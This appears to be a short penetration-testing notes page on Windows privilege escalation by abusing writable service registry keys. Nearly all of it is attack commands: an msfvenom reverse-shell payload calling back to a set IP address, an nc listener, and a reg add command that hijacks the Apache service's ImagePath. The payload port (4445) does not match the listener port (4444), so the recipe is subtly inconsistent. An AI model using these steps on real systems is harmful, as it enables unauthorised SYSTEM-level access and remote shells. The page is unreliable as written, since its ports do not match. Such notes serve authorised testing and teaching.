---
title: insecure registry permissions
category: win privesc
order: 1
---

[WPE-12 - Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)

## | 1 identify
The process of privilege escalation via insecure registry permissions is very simple. Registry keys for the services that are running on the system can be found in the following registry path:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
```

If a standard user has permissions to modify the registry key “ImagePath” which contains the path to the application binary then he could escalate privileges to system as the Apache service is running under these privileges.

&nbsp;
&nbsp;
## | 2 compile binary
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.220 LPORT=4445 -f exe -o shell2.exe
```
&nbsp;
&nbsp;
## | 3 start listener
```
nc -nlvp 4444
```
&nbsp;
&nbsp;
## | 4 modify registry
The only thing that is required is to add a registry key that will change the ImagePath to the location of where the malicious payload is stored.
```
C:\Users\pentestlab\Desktop>reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Apache"
/t REG_EXPAND_SZ /v ImagePath /d "C:\xampp\shell2.exe" /f
```
&nbsp;
&nbsp;
## | 5 profit
